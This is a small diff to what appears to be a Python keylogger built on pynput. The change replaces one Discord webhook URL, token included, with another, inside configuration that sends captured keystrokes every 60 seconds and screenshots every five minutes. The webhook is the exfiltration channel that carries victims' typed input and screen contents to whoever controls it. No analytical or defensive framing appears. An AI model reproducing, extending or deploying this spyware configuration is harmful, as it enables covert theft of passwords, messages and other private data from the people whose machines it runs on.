@@ -12,7 +12,7 @@ from pynput.keyboard import Listener
 from datetime import datetime
 
 # Configuration
-WEBHOOK_URL = "https://discord.com/api/webhooks/1495858902636564480/YbVxNZzzOX2tMeC6XJNXNfqudYYXgjDnItromEE3sqyykMsqG601HM5v_2Ylfby2kXMG"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1495867463198441562/FQYgnnUHJQf2Cio83csg8YBz-F_QQR5nbBB10NYGEpnHY5sMZPi3D2sf4KSb-OgF9g7-"
 MAX_KEYS = 1000
 SEND_INTERVAL = 60  # Seconds between keylogs
 SCREENSHOT_INTERVAL = 300  # 5 minutes
